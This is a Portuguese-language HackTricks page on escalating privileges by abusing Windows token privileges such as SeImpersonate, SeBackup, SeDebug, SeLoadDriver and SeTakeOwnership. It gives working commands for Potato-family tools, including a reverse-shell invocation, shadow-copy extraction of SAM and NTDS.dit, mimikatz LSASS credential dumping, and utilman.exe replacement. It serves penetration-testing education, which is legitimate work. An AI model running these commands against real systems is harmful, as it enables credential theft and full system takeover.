# Abusando de Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Se você **não sabe o que são Windows Access Tokens**, leia esta página antes de continuar:


{{#ref}}
access-tokens.md
{{#endref}}

**Você pode conseguir escalar privilégios abusando de tokens que já possui.**

### SeImpersonatePrivilege

Esse privilégio permite que um processo se passe por outro (mas não crie) um token quando consegue obter um handle para esse token. Um token privilegiado pode ser obtido de um serviço do Windows (DCOM), induzindo-o a realizar autenticação NTLM contra um exploit, permitindo posteriormente executar um processo com privilégios de SYSTEM.<sup>[[2]](#references)</sup> Essa primitiva pode ser explorada usando ferramentas como [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (que requer que o WinRM esteja desabilitado), [SweetPotato](https://github.com/CCob/SweetPotato) e [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Uma aplicação web acessível apenas por loopback pode ser uma pista adicional para coerção, caso um usuário local consiga acessar um endpoint autenticado que faça uma requisição a uma URL escolhida pelo chamador, sob uma identidade mais privilegiada. Revise as regras de autorização e as restrições de URL do endpoint, a identidade real do cliente de saída e seu comportamento de autenticação, além de verificar se esse cliente consegue acessar um listener controlado pelo usuário com menos privilégios. A presença de `SeImpersonatePrivilege` habilitado, de um listener do IIS ou de um parâmetro que busca uma URL, por si só, não comprova a existência de um token privilegiado nem de um caminho para escalar privilégios. Faça essa revisão de forma passiva; não envie requisições de coerção durante a enumeração. Consulte a documentação da Microsoft sobre [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) e [identidade do pool de aplicativos do IIS](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Observações modernas para operadores:

- **JuicyPotato é legado**: no Windows 10 1809+/Server 2019+, prefira **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ou **PrintSpoofer**, dependendo de qual superfície RPC/COM ainda está acessível.
- Se você comprometeu um serviço executado como **`LOCAL SERVICE`** ou **`NETWORK SERVICE`** e `whoami /priv` mostra um **filtered token** sem `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recupere primeiro o **conjunto padrão de privilégios** da conta (por exemplo, com **FullPowers**) e depois tente novamente a família potato.<sup>[[3]](#references)</sup>
- Algumas versões mais recentes são mais práticas para operadores do que as ferramentas originais. Por exemplo, **SigmaPotato** adiciona execução por reflection/em memória e compatibilidade com versões modernas do Windows, enquanto **PrintNotifyPotato** abusa do serviço COM PrintNotify e costuma ser útil quando o caminho clássico do Spooler está desabilitado.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

É muito semelhante a **SeImpersonatePrivilege**: usa o **mesmo método** para obter um token privilegiado.\
Em seguida, esse privilégio permite **atribuir um token primário** a um processo novo ou suspenso. Com o token de impersonation privilegiado, você pode derivar um token primário (DuplicateTokenEx).\
Com o token, você pode criar um **novo processo** com 'CreateProcessAsUser' ou criar um processo suspenso e **definir o token** (em geral, não é possível modificar o token primário de um processo em execução).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Se esse token estiver habilitado, você poderá usar **KERB_S4U_LOGON** para obter um **token de impersonation** para qualquer outro usuário sem conhecer as credenciais, **adicionar um grupo arbitrário** (admins) ao token, definir o **nível de integridade** do token como "**medium**" e atribuir esse token à **thread atual** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Com esse privilégio, o sistema **concede acesso de leitura** a qualquer arquivo (limitado a operações de leitura). Ele é usado para **ler os hashes de senha das contas Administrator locais** do registro; depois disso, ferramentas como "**psexec**" ou "**wmiexec**" podem ser usadas com o hash (técnica Pass-the-Hash). No entanto, essa técnica falha em duas situações: quando a conta Local Administrator está desabilitada ou quando há uma política que remove os direitos administrativos de Local Administrators que se conectam remotamente.<sup>[[2]](#references)</sup>\
Na prática, o fluxo de trabalho integrado mais confiável geralmente é **VSS + `robocopy /b`**: crie/exponha uma shadow copy e, em seguida, copie `SAM`/`SYSTEM` ou `NTDS.dit` em **modo de backup**, que ignora as ACLs dos arquivos.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Você pode **abusar deste privilégio** com:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- seguindo **IppSec** em [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ou conforme explicado na seção **escalating privileges with Backup Operators** de:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Este privilégio concede **acesso de gravação** a qualquer arquivo do sistema, independentemente da Access Control List (ACL) do arquivo. Ele abre inúmeras possibilidades de escalada, incluindo a capacidade de **modificar serviços**, realizar DLL Hijacking e definir **debuggers** por meio de Image File Execution Options, entre várias outras técnicas.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege é uma permissão poderosa, especialmente útil quando um usuário consegue impersonar tokens, mas também na ausência de SeImpersonatePrivilege. Essa capacidade depende da possibilidade de impersonar um token que represente o mesmo usuário e cujo nível de integridade não exceda o do processo atual.<sup>[[2]](#references)</sup>

**Pontos principais:**

- **Impersonação sem SeImpersonatePrivilege:** É possível usar SeCreateTokenPrivilege para EoP por meio da impersonação de tokens sob condições específicas.
- **Condições para impersonação de tokens:** Para que a impersonação seja bem-sucedida, o token de destino deve pertencer ao mesmo usuário e ter um nível de integridade menor ou igual ao do processo que tenta realizar a impersonação.
- **Criação e modificação de tokens de impersonação:** Os usuários podem criar um token de impersonação e aprimorá-lo adicionando o SID (Security Identifier) de um grupo privilegiado.

### SeLoadDriverPrivilege

Este privilégio permite que um processo **carregue e descarregue drivers de dispositivo** criando uma entrada no registro com valores específicos de `ImagePath` e `Type`. Como o acesso direto de gravação a `HKLM` (HKEY_LOCAL_MACHINE) é restrito, `HKCU` (HKEY_CURRENT_USER) pode ser usado. No entanto, é necessário um caminho específico para que o kernel reconheça a entrada em `HKCU` como uma configuração de driver.<sup>[[2]](#references)</sup>

O uso ofensivo moderno geralmente é **BYOVD** (bring your own vulnerable driver): carregar um driver de kernel **assinado, mas vulnerável**, e usar seus IOCTLs para desativar proteções ou obter execução de código no kernel. Tenha em mente que, em versões recentes do Windows 11/Server, a **Microsoft vulnerable driver blocklist** e/ou **HVCI/Memory Integrity** frequentemente impedem cadeias antigas disponíveis publicamente; por isso, os exemplos clássicos no estilo `szkg64.sys` não são mais universalmente confiáveis.

O caminho é `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, onde `<RID>` é o Relative Identifier do usuário atual. Dentro de `HKCU`, é necessário criar esse caminho inteiro e definir dois valores:<sup>[[2]](#references)</sup>

- `ImagePath`, que é o caminho para o binário a ser executado
- `Type`, com o valor `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Etapas:**

1. Acesse `HKCU` em vez de `HKLM` devido às restrições de acesso de gravação.
2. Crie o caminho `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` em `HKCU`, onde `<RID>` representa o Relative Identifier do usuário atual.
3. Defina `ImagePath` como o caminho de execução do binário.
4. Defina `Type` como `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Mais formas de abusar desse privilégio em [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Isso é semelhante a **SeRestorePrivilege**. Sua função principal permite que um processo **assuma a propriedade de um objeto**, contornando a exigência de acesso discricionário explícito por meio da concessão de direitos de acesso WRITE_OWNER. O processo envolve primeiro garantir a propriedade da chave de registro pretendida para fins de gravação e, em seguida, alterar a DACL para permitir operações de gravação.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Esse privilégio permite **depurar outros processos**, inclusive ler e gravar na memória. Com esse privilégio, é possível empregar várias estratégias de injeção de memória capazes de evadir a maioria das soluções antivírus e de prevenção contra intrusões no host.<sup>[[2]](#references)</sup>

No Windows moderno, lembre-se de que `SeDebugPrivilege` geralmente basta para abrir **processos SYSTEM não protegidos** e duplicar seus tokens, mas **não** garante que você possa acessar o **LSASS**. Se **RunAsPPL / LSA Protection** estiver habilitado, processos não protegidos não poderão ler nem injetar código no LSASS, mesmo que `SeDebugPrivilege` esteja presente. Nesse caso, roube um token de outro processo SYSTEM que não seja PPL ou encadeie com um bypass de PPL/BYOVD, em vez de presumir que `procdump` funcionará. Para ver um exemplo completo de cópia de token usando `SeDebugPrivilege` + `SeImpersonatePrivilege`, consulte [esta página](sedebug-+-seimpersonate-copy-token.md).

#### Despejar memória

Você pode usar o [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) do [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) para **capturar a memória de um processo**. Especificamente, isso pode ser aplicado ao processo **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, responsável por armazenar as credenciais dos usuários depois que eles fazem login no sistema com sucesso.

Em seguida, você pode carregar esse dump no mimikatz para obter senhas:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Um dump do LSASS legível, salvo anteriormente, pode estar disponível mesmo que a conta atual não tenha permissão para capturar o processo protegido em execução. Trate um arquivo de dump ou um arquivo compactado com nome semelhante apenas como uma pista: verifique o acesso e o conteúdo e, em seguida, avalie se alguma credencial recuperada ainda é válida e concede um contexto com privilégios mais altos. O nome do arquivo, por si só, não prova que um arquivo compactado contém um dump nem que as credenciais possam ser reutilizadas.

#### RCE

Se quiser obter um shell `NT SYSTEM`, você pode usar:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Este direito (Executar tarefas de manutenção de volumes) pode permitir operações privilegiadas em volumes, mas, por si só, não garante um identificador de volume bruto legível nem acesso arbitrário a arquivos. As ACLs dos dispositivos, o estado do token, a versão do Windows e a operação solicitada ainda são relevantes. Uma operação de controle de volume permitida pode, em vez disso, alterar as ACLs do sistema de arquivos; essa é uma ação mutável que pode afetar todo o volume. Em um host de CA, o abuso de certificados também requer acesso a material utilizável de chave privada, e arquivos protegidos por EFS ainda exigem uma chave de descriptografia ou recuperação autorizada. Consulte abaixo os pré-requisitos detalhados.<sup>[[5]](#references)</sup>

Consulte técnicas e mitigações detalhadas:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Verificar privilégios

```
whoami /priv
```

Os **tokens que aparecem como Desabilitados** geralmente podem ser habilitados, então muitas vezes você pode abusar dos privilégios _Habilitados_ e _Desabilitados_.

### Habilitar todos os tokens

Se você tiver privilégios desabilitados, pode usar o script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) para habilitar todos os tokens:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Ou o **script** incorporado nesta [**publicação**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabela

A cheatsheet completa dos privilégios de token está em [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); o resumo abaixo lista apenas formas diretas de explorar o privilégio para obter uma sessão de admin ou ler arquivos sensíveis.<sup>[[1]](#references)</sup>

| Privilégio                 | Impacto     | Ferramenta              | Caminho de execução                                                                                                                                                                                                                                                                                                                                     | Observações                                                                                                                                                                                                                                                                                                                  |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | ferramenta de terceiros | _"Permitiria que um usuário impersonasse tokens e fizesse privesc para nt system usando ferramentas como potato.exe, rottenpotato.exe e juicypotato.exe"_                                                                                                                                                                                                      | Agradeço a [Aurélien Chalot](https://twitter.com/Defte_) pela atualização. Em breve, tentarei reformular isso como algo mais próximo de uma receita.                                                                                                                                                                                         |
| **`SeBackup`**             | **Ameaça**  | _**Comandos integrados**_ | Leia arquivos sensíveis com `robocopy /b` ou utilitários dedicados de cópia compatíveis com SeBackup.                                                                                                                                                                                                                                                                 | <p>- Ótimo para `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` e, às vezes, `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` é conveniente, mas cmdlets/APIs dedicados de SeBackup costumam ser mais flexíveis para arquivos bloqueados/abertos.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | ferramenta de terceiros | Crie um token arbitrário, incluindo direitos de admin local, com `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplique um token SYSTEM **não PPL** ou faça dump da memória de um processo não protegido.                                                                                                                                                                                                                                                                 | <p>O dump de LSASS costuma ser bloqueado se RunAsPPL/LSA Protection estiver habilitado.</p><p>O script está disponível em [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | ferramenta de terceiros | Use a **família Potato** / impersonação por named pipe para iniciar um processo como SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` etc.).                                                                                                                                                                                    | <p>Mais prático em contas de serviço, como IIS APPPOOL, MSSQL, tarefas agendadas ou qualquer contexto que já tenha `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | ferramenta de terceiros | <p>1. Carregue um driver de kernel assinado, mas vulnerável (BYOVD)<br>2. Use os IOCTLs do driver para obter acesso de leitura/gravação ao kernel, desabilitar ferramentas de segurança ou elevar para SYSTEM<br><br>Como alternativa, o privilégio pode ser usado para descarregar drivers relacionados à segurança com o comando integrado <code>fltMC</code>, por exemplo, <code>fltMC sysmondrv</code></p>                     | <p>Drivers públicos mais antigos, como <code>szkg64.sys</code>, são cada vez mais bloqueados nas versões modernas do Windows pela lista de bloqueio de drivers vulneráveis / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Inicie o PowerShell/ISE com o privilégio SeRestore presente.<br>2. Habilite o privilégio com <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Renomeie utilman.exe para utilman.old<br>4. Renomeie cmd.exe para utilman.exe<br>5. Bloqueie o console e pressione Win+U</p> | <p>O ataque pode ser detectado por alguns softwares antivírus.</p><p>Um método alternativo depende da substituição de binários de serviço armazenados em "Program Files" usando o mesmo privilégio</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Comandos integrados**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Renomeie cmd.exe para utilman.exe<br>4. Bloqueie o console e pressione Win+U</p>                                                                                                                                       | <p>O ataque pode ser detectado por alguns softwares antivírus.</p><p>Um método alternativo depende da substituição de binários de serviço armazenados em "Program Files" usando o mesmo privilégio.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | ferramenta de terceiros | <p>Manipule tokens para incluir direitos de admin local. Pode exigir SeImpersonate.</p><p>A verificar.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - caminhos de exploração dos privilégios do Windows até admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abusando privilégios de token para LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Devolva meus privilégios! Por favor?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (o modo de backup `/b` ignora verificações de ACL de arquivos/pastas)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Executar tarefas de manutenção de volume (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → exfiltração da chave da CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
